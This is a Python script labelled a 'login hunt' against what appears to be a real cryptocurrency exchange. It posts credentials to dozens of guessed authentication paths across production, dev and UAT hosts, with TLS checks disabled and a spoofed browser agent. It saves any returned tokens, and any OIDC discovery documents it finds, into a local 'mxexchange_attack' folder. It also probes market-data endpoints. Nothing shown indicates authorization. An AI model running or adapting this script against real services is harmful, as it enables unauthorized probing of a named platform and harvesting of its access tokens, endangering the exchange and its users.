import requests, json, sys, urllib3
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20

def safe(t, n=500):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

H = {"Content-Type":"application/json","Accept":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

EMAIL = "testuser@gmail.com"
PASS = "TestPass123!@#"

# All possible hosts for login
hosts = {
    "identity_hkdev": "https://identityhkdev.mx.exchange",
    "account_hkdev": "https://accounthkdev.mx.exchange",
    "identity_prod": "https://identity.mx.exchange",
    "account_prod": "https://account.mx.exchange",
    "openapi_prod": "https://openapi.mx.exchange",
    "uat": "https://openapiuat.azurewebsites.net",
    "app": "https://app.mx.exchange",
}

# Common login paths for ASP.NET / IdentityServer
login_paths = [
    ("/connect/token", "POST", {"grant_type": "password", "username": EMAIL, "password": PASS, "scope": "openid profile email"}),
    ("/api/Account/Login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/account/login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/Auth/Login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/auth/login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/Token", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/token", "POST", {"email": EMAIL, "password": PASS}),
    ("/token", "POST", {"grant_type": "password", "username": EMAIL, "password": PASS}),
    ("/api/Identity/Login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/Users/Login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/v1/auth/login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/1/auth/login", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/Account/SignIn", "POST", {"email": EMAIL, "password": PASS}),
    ("/api/login", "POST", {"email": EMAIL, "password": PASS}),
    ("/login", "POST", {"email": EMAIL, "password": PASS}),
    # Form-encoded variants
    ("/connect/token", "FORM", {"grant_type": "password", "username": EMAIL, "password": PASS, "scope": "openid"}),
    ("/token", "FORM", {"grant_type": "password", "username": EMAIL, "password": PASS}),
    ("/api/token", "FORM", {"grant_type": "password", "username": EMAIL, "password": PASS}),
]

print("=" * 70)
print(f"MX EXCHANGE — LOGIN HUNT ({EMAIL})")
print("=" * 70)

found = False
for host_name, base in hosts.items():
    print(f"\n--- {host_name} ({base}) ---")
    for path, method, data in login_paths:
        url = f"{base}{path}"
        try:
            if method == "POST":
                r = requests.post(url, json=data, headers=H, timeout=T, verify=False)
            elif method == "FORM":
                r = requests.post(url, data=data, headers={**H, "Content-Type": "application/x-www-form-urlencoded"}, timeout=T, verify=False)
            
            if r.status_code == 404:
                continue
            
            tag = "[!!!]" if r.status_code in (200,201) else f"[{r.status_code}]"
            print(f"  {tag} {method:4s} {path} => {r.status_code} ({len(r.text)}b) {safe(r.text, 400)}")
            
            if r.status_code in (200, 201) and r.text:
                try:
                    j = r.json()
                    if "token" in str(j).lower() or "access" in str(j).lower() or "bearer" in str(j).lower():
                        print(f"\n  !!! JWT/TOKEN FOUND !!!")
                        print(f"  {json.dumps(j, indent=2)[:1000]}")
                        found = True
                        with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\jwt_token.json", "w") as f:
                            json.dump(j, f, indent=2)
                except:
                    pass
                    
        except requests.exceptions.ConnectTimeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except Exception as e:
            continue
    
    if found:
        break

# Also check .well-known endpoints for OAuth/OIDC discovery
print(f"\n\n--- OIDC DISCOVERY ---")
for host_name, base in hosts.items():
    for wk_path in ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server"]:
        try:
            r = requests.get(f"{base}{wk_path}", headers=H, timeout=T, verify=False)
            if r.status_code == 200 and r.text and len(r.text) > 50:
                print(f"  [!!!] {host_name} {wk_path} => {r.status_code} ({len(r.text)}b)")
                print(f"    {safe(r.text, 500)}")
                with open(f"c:\\xampp\\htdocs\\pentagi\\mxexchange_attack\\oidc_{host_name}.json", "w") as f:
                    f.write(r.text)
        except:
            continue

# Try market data with proper headers
print(f"\n\n--- MARKET DATA RETRY ---")
for env, base in [("UAT", "https://openapiuat.azurewebsites.net"), ("PROD", "https://openapi.mx.exchange")]:
    for path in ["/api/1/ticker?pair=BTCMYR", "/api/1/ticker/all", "/api/1/orderbook?pair=BTCMYR", 
                 "/api/1/currency", "/api/1/currency/active", "/api/1/trade?pair=BTCMYR&limit=5"]:
        try:
            r = requests.get(f"{base}{path}", headers={"Accept":"application/json","User-Agent":"Mozilla/5.0"}, 
                           timeout=T, verify=False)
            if r.status_code == 200 and r.text:
                print(f"  [{env}] {path} => {r.status_code} ({len(r.text)}b) {safe(r.text, 300)}")
            elif r.status_code != 404:
                print(f"  [{env}] {path} => {r.status_code}")
        except:
            continue

print(f"\n{'='*70}")
print("DONE")
